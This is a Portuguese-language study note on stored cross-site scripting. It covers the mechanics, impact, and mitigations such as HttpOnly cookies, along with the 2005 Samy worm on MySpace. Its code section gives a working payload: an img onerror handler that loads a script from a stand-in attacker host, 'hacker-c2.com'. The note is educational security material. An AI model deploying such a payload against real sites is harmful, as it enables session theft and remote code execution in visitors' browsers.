---
tags:
  - afinidade/alta
  - status/3_incubadora
  - tipo/conceito
  - contexto/dev/cyber/ataque
---

### Cyber_Ataque_XSS_Stored

#### 1. O Axioma (A Definição Rígida)
**O que é:** O Cross-Site Scripting Armazenado (Persistente) é a variante epidêmica letal do XSS onde o payload do atacante não é apenas refletido, mas salvo nativamente no banco de dados do servidor, infectando passivamente qualquer navegador que venha a acessar a página comprometida no futuro.

#### 2. A Desconstrução (Mecânica e Pontos de Falha)
*   **Como Funciona:** O atacante localiza um campo de entrada que será visualizado por outras pessoas (fóruns, resenhas de produtos, campos de biografia do perfil). Ele injeta a carga maliciosa lá. O backend salva essa string literal no banco de dados. Semanas depois, quando um cliente (ou um Administrador do site) abrir a página desse produto, o banco de dados entregará o script invisível para o frontend da vítima, que o executará.
*   **O Problema que Causa:** O ataque em massa sem a necessidade de [[Cyber_Phishing]]. A bomba já está plantada dentro das muralhas. É utilizado massivamente para sequestrar contas de usuários com alto privilégio (como um Administrador acessando o painel de atendimento ao cliente) ou minerar criptomoedas silenciosamente na aba do usuário.
*   **Visão Sênior (Vulnerabilidades/Escala):** A falha aqui não pode ser corrigida apenas no frontend. O banco de dados foi fisicamente corrompido com lógica no lugar de dados brutos. Ferramentas defensivas como [[DevSecOps_DAST]] e [[DevSecOps_IAST]] são vitais para mapear campos vulneráveis na homologação. Como mitigação de impacto contra o roubo de sessão, arquitetos forçam o uso compulsório da flag `HttpOnly` na criação dos cookies, impossibilitando que a API `document.cookie` acesse a credencial de autenticação, anulando 90% do dano.

#### 3. As Sinapses (Conexões Livres e Interdisciplinares)
Se o XSS Refletido é um espelho com um laser temporário, o XSS Armazenado é **uma Mina Terrestre Química enterrada no parquinho da prefeitura**. O criminoso não precisa estar presente nem precisa enviar a vítima até lá. Ele enterra a armadilha de madrugada (Injeção no Banco de Dados). Amanhã, semana que vem ou no mês seguinte, qualquer criança inocente que pisar na grama lendo a placa do parque (Visualizando a página) vai acionar o pino da mina, sendo infectada pelo veneno da bomba automaticamente de forma cíclica e escalável.

#### 4. Pragmatismo Aplicado (Código e Implementação)
Um payload silencioso de XSS injetado em um campo `<input>` de comentário do usuário. Ele usa o evento `onerror` embutido em uma tag de imagem quebrada de 1 pixel para evadir filtros simples e executar o javascript nativamente no carregamento do DOM:
```html
<img src="invalido.jpg" onerror="var s=document.createElement('script');s.src='http://hacker-c2.com/payload.js';document.body.appendChild(s);">
````

5. História do Conteúdo

O marco zero histórico e aterrorizante do XSS persistente ocorreu em 2005 com o "Samy Worm" na rede social MySpace. O programador Samy Kamkar abusou de falhas de filtro para gravar um script persistente no próprio perfil. Qualquer usuário do MySpace que visitasse a página de Samy, automaticamente, sem clicar em nada, o adicionava como "Herói" e colava a bomba no seu próprio perfil. O crescimento foi matemático e exponencial, infectando mais de 1 milhão de perfis em apenas 20 horas e forçando o MySpace a desligar os servidores para conter o contágio.